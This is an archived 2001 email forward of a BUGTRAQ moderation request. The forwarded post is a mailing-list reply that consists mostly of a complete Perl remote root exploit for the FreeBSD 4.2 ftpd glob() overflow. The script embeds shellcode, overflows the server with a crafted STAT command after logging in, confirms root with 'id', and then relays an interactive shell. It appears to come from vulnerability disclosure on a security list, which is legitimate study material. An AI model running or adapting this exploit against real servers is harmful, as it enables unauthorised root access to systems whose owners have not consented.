From aleph1@SECURITYFOCUS.COM Thu Apr 19 10:28:51 2001
Date: Mon, 16 Apr 2001 11:32:31 -0600
From: Elias Levy <aleph1@SECURITYFOCUS.COM>
To: vulq@securityfocus.com
Subject: (forw) BUGTRAQ: approval required (A3770A96)


-- 
Elias Levy
SecurityFocus.com
http://www.securityfocus.com/
Si vis pacem, para bellum

    [ Part 2: "Included Message" ]

Date: Mon, 16 Apr 2001 02:50:40 -0600
From: "L-Soft list server at SecurityFocus.com (1.8d)"
    <LISTSERV@LISTS.SECURITYFOCUS.COM>
To: Elias Levy <aleph1@SECURITYFOCUS.COM>
Subject: BUGTRAQ: approval required (A3770A96)

This  message was  originally submitted  by venglin@FREEBSD.LUBLIN.PL  to the
BUGTRAQ list  at LISTS.SECURITYFOCUS.COM. You  can approve it using  the "OK"
mechanism,  ignore it,  or repost  an edited  copy. The  message will  expire
automatically and you do not need to  do anything if you just want to discard
it. Please refer to  the list owner's guide if you are  not familiar with the
"OK" mechanism; these instructions are being kept purposefully short for your
convenience in processing large numbers of messages.

----------------- Original message (ID=A3770A96) (193 lines) ------------------
Return-Path: <owner-bugtraq@securityfocus.com>
Delivered-To: bugtraq@lists.securityfocus.com
Received: from securityfocus.com (mail.securityfocus.com [66.38.151.9])
	by lists.securityfocus.com (Postfix) with SMTP id 5B0E024E699
	for <bugtraq@lists.securityfocus.com>; Mon, 16 Apr 2001 02:45:19 -0600 (MDT)
Received: (qmail 11252 invoked by alias); 16 Apr 2001 08:45:20 -0000
Delivered-To: BUGTRAQ@SECURITYFOCUS.COM
Received: (qmail 11244 invoked from network); 16 Apr 2001 08:45:20 -0000
Received: from yeti.ismedia.pl (212.182.96.18)
  by mail.securityfocus.com with SMTP; 16 Apr 2001 08:45:20 -0000
Received: (qmail 33083 invoked from network); 16 Apr 2001 08:45:20 -0000
Received: from unknown (HELO lagoon.freebsd.lublin.pl) (212.182.115.11)
  by 0 with SMTP; 16 Apr 2001 08:45:20 -0000
Received: (qmail 15361 invoked from network); 16 Apr 2001 08:45:19 -0000
Received: from unknown (HELO riget.scene.pl) ()
  by 0 with SMTP; 16 Apr 2001 08:45:19 -0000
Received: (qmail 15355 invoked by uid 1001); 16 Apr 2001 08:45:19 -0000
Date: Mon, 16 Apr 2001 10:45:19 +0200
From: Przemyslaw Frasunek <venglin@freebsd.lublin.pl>
To: fish stiqz <fish@ANALOG.ORG>
Cc: BUGTRAQ@SECURITYFOCUS.COM
Subject: Re: Remote BSD ftpd glob exploit
Message-ID: <20010416104519.V700@riget.scene.pl>
References: <20010414164143.A15585@analog.org>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i
In-Reply-To: <20010414164143.A15585@analog.org>; from fish@ANALOG.ORG on Sat, Apr 14, 2001 at 04:41:43PM -0400

On Sat, Apr 14, 2001 at 04:41:43PM -0400, fish stiqz wrote:
> If anyone gets this working on other systems, let me know.

This is another version of globbing exploit, written about week ago. It
creates only one directory.

#!/usr/bin/perl

###############################################################################
# glob() ftpd remote root exploit for freebsd 4.2-stable                      #
#                                                                             #
# babcia padlina ltd. / venglin@freebsd.lublin.pl                             #
#                                                                             #
# this version requires user access and writeable homedir without chroot.     #
###############################################################################

require 5.002;
use strict;
use sigtrap;
use Socket;

my($recvbuf, $host, $user, $pass, $iaddr, $paddr, $proto, $code, $ret, $off, $align, $rin, $rout, $read);

# teso shellcode ripped from 7350obsd

$code  = "\x31\xc0\x99\x52\x52\xb0\x17\xcd\x80\x68\xcc\x73\x68\xcc\x68";
$code .= "\xcc\x62\x69\x6e\xb3\x2e\xfe\xc3\x88\x1c\x24\x88\x5c\x24\x04";
$code .= "\x88\x54\x24\x07\x89\xe6\x8d\x5e\x0c\xc6\x03\x2e\x88\x53\x01";
$code .= "\x52\x53\x52\xb0\x05\xcd\x80\x89\xc1\x8d\x5e\x05\x6a\xed\x53";
$code .= "\x52\xb0\x88\xcd\x80\x53\x52\xb0\x3d\xcd\x80\x51\x52\xb0\x0c";
$code .= "\x40\xcd\x80\xbb\xcc\xcc\xcc\xcc\x81\xeb\x9e\x9e\x9d\xcc\x31";
$code .= "\xc9\xb1\x10\x56\x01\xce\x89\x1e\x83\xc6\x03\xe0\xf9\x5e\x8d";
$code .= "\x5e\x10\x53\x52\xb0\x3d\xcd\x80\x89\x76\x0c\x89\x56\x10\x8d";
$code .= "\x4e\x0c\x52\x51\x56\x52\xb0\x3b\xcd\x80\xc9\xc3\x55\x89\xe5";
$code .= "\x83\xec\x08\xeb\x12\xa1\x3c\x50\x90";

#$ret = 0xbfbfeae8; - stos lagoona
#$ret = 0x805baf8; - bss info
$ret = 0x805e23a; # - bss lagoon

if (@ARGV < 3)
{
	print "Usage: $0 <hostname> <username> <password> [align] [offset]\n";
	exit;
}

($host, $user, $pass, $align, $off) = @ARGV;

if (defined($off))
{
	$ret += $off;
}

if (!defined($align))
{
	$align = 1;
}

print "Globulka v1.0 by venglin\@freebsd.lublin.pl\n\n";
print "RET: 0x" . sprintf('%lx', $ret) . "\n";
print "Align: $align\n\n";

$iaddr = inet_aton($host)			or die "Unknown host: $host\n";
$paddr = sockaddr_in(21, $iaddr)		or die "getprotobyname: $!\n";
$proto = getprotobyname('tcp')			or die "getprotobyname: $!\n";

socket(SOCKET, PF_INET, SOCK_STREAM, $proto)	or die "socket: $!\n";
connect(SOCKET, $paddr)				or die "connect: $!\n";

do
{
	$recvbuf = <SOCKET>;
}
while($recvbuf =~ /^220- /);

print $recvbuf;

if ($recvbuf !~ /^220 .+/)
{
	die "Exploit failed.\n";
}

send(SOCKET, "USER $user\r\n", 0)		or die "send: $!\n";
$recvbuf = <SOCKET>;

if ($recvbuf !~ /^(331|230) .+/)
{
	print $recvbuf;
	die "Exploit failed.\n";
}

send(SOCKET, "PASS $pass\r\n", 0)		or die "send: $!\n";
$recvbuf = <SOCKET>;

if ($recvbuf !~ /^230 .+/)
{
	print $recvbuf;
	die "Exploit failed.\n";
}
else
{
	print "Logged in as $user/$pass. Sending evil STAT command.\n\n";
}

send(SOCKET, "MKD " . "A"x255 . "\r\n", 0)		or die "send: $!\n";
$recvbuf = <SOCKET>;

if ($recvbuf !~ /^(257|550) .+/)
{
	print $recvbuf;
	die "Exploit failed.\n";
}

send(SOCKET, "STAT A*/../A*/../A*/" . "\x90" x (90+$align) . $code .
	pack('l', $ret) x 30 . "\r\n", 0)		or die "send: $!\n";

sleep 1;

send(SOCKET, "id\n", 0) 			or die "send: $!\n";
$recvbuf = <SOCKET>;

if ($recvbuf !~ /^uid=.+/)
{
	die "Exploit failed.\n";
}
else
{
	print $recvbuf;
}

vec($rin, fileno(STDIN), 1) = 1;
vec($rin, fileno(SOCKET), 1) = 1;

for(;;)
{
	$read = select($rout=$rin, undef, undef, undef);
	if (vec($rout, fileno(STDIN), 1) == 1)
	{
		if (sysread(STDIN, $recvbuf, 1024) == 0)
		{
			exit;
		}
		send(SOCKET, $recvbuf, 0);
	}

	if (vec($rout, fileno(SOCKET), 1) == 1)
	{
		if (sysread(SOCKET, $recvbuf, 1024) == 0)
		{
			exit;
		}
		syswrite(STDIN, $recvbuf, 1024);
	}
}

close SOCKET;

exit;

-- 
* Fido: 2:480/124 ** WWW: http://www.frasunek.com/ ** NIC-HDL: PMF9-RIPE *
* Inet: przemyslaw@frasunek.com ** PGP: D48684904685DF43EA93AFA13BE170BF *
